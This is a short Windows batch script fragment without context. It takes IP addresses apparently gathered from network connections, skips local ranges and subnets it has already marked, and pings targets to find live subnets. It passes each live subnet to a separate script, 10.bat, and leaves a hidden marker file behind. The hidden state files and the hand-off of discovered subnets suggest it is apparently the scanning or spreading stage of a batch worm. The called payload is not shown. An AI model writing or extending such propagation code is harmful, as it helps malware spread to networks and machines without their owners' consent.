IF "%IP5%"=="SYN_SENT" GOTO END
IF EXIST "%IP1%.%IP2%.%IP3%" GOTO END
IF "%IP1%.%IP2%.%IP3%"=="192.168.0" GOTO END
IF "%IP1%.%IP2%.%IP3%"=="127.0.0" GOTO END

PING %IP1%.%IP2%.%IP3%.%IP4% >B.TMP
PING %IP1%.%IP2%.%IP3%.1 >>B.TMP
FIND /C /I "from" B.TMP
IF ERRORLEVEL 1 GOTO END

SET IP1A=%IP1%.%IP2%
CALL 10.bat %IP3%
ECHO . > "%IP1%.%IP2%.%IP3%"
attrib "%IP1%.%IP2%.%IP3%" +H
:END
